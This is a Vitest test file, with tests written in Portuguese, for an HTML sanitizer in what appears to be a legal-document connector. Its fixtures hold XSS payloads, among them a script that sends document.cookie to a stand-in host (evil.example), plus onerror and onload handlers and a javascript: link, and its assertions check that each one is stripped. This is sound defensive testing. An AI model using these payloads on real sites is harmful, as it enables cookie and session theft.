import { describe, expect, it } from 'vitest';
import {
  escapeHtmlEntities,
  plainTextToSafeHtml,
  sanitizeDocumentHtml,
} from '../src/utils/html-sanitizer';

describe('Fase 1 Security — Connector HTML Sanitizer (HIGH-06)', () => {
  it('remove tags <script>, <iframe>, <svg>, <style> e event handlers on*', () => {
    const dirty = `
      <p onclick="alert('xss')">Minuta de Usucapião</p>
      <script>fetch('https://evil.example/steal?c=' + document.cookie)</script>
      <img src="x" onerror="alert(1)" />
      <svg onload="alert(2)"><circle /></svg>
      <iframe src="https://evil.example"></iframe>
      <a href="javascript:alert(3)">Clique malicioso</a>
      <a href="https://tj.sp.gov.br/processo">Processo Oficial</a>
    `;

    const clean = sanitizeDocumentHtml(dirty, '');

    expect(clean).not.toContain('<script');
    expect(clean).not.toContain('onclick');
    expect(clean).not.toContain('onerror');
    expect(clean).not.toContain('onload');
    expect(clean).not.toContain('<svg');
    expect(clean).not.toContain('<iframe');
    expect(clean).not.toContain('javascript:');
    expect(clean).toContain('<p>Minuta de Usucapião</p>');
    expect(clean).toContain('href="https://tj.sp.gov.br/processo"');
    expect(clean).toContain('rel="noopener noreferrer"');
  });

  it('escapa entidades perigosas em texto puro e tags truncadas', () => {
    const raw = 'Linha 1 <img src=x onerror=alert(1)>\n\nLinha 2 & "aspas"';
    const html = plainTextToSafeHtml(raw);
    expect(html).not.toContain('<img');
    expect(html).toContain('&lt;img src=x onerror=alert(1)&gt;');
    expect(html).toContain('&amp; &quot;aspas&quot;');

    const truncated = '<p>Texto seguro</p><img src=x onerror=alert(1)';
    const cleanedTruncated = sanitizeDocumentHtml(truncated, '');
    expect(cleanedTruncated).not.toContain('<img');
    expect(escapeHtmlEntities('<script>')).toBe('&lt;script&gt;');
  });
});

